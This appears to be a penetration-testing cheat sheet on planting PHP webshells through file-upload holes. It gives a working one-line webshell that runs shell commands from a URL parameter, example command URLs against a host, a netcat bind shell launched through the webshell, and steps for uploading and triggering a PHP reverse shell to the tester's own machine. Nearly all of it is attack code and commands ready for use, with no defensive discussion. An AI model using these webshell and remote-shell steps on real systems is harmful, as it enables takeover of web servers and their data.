# WEBSHELLS
#### PHP: Upload Vulnerabilities
If a webserver is using PHP and there's a way to upload a file then create a .php file containing the following code:
```text
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
If you can sucsessfully upload the file then navigate to the upload location. 
Example:
- http://10.10.10.10/uploads/shell.php

If you navigate to the url and it's blank this is usually good, if there's errors you might not be in the right place. 
Now add ?cmd= to the end of the url to start passing through commands.
Example:
- http://10.10.10.10/uploads/shell.php?cmd=[the_command]
- http://10.10.10.10/uploads/shell.php?cmd=whoami

This could be leveraged to create a netcat bind or reverse shell.
Example (bind shell):
- http://10.10.10.10/uploads/shell.php?cmd=nc -h (to check netcat is installed)
- http://10.10.10.10/uploads/shell.php?cmd=nc -lnvp 1234 -e /bin/bash (create a listener on the webserver)
- Then connect to the listening port using netct (nc 10.10.10.10 1234)

Example (reverse shell):
- Change the ip address and port for the /usr/share/webshells/php/php-reverse-shell.php on your kali machine.
- Upload the shell to you webpage.
- Set up a netcat listener (nc -lnvp 1234) on your machine
- Navigate to the upload location to trigger the .php reverse shell code.
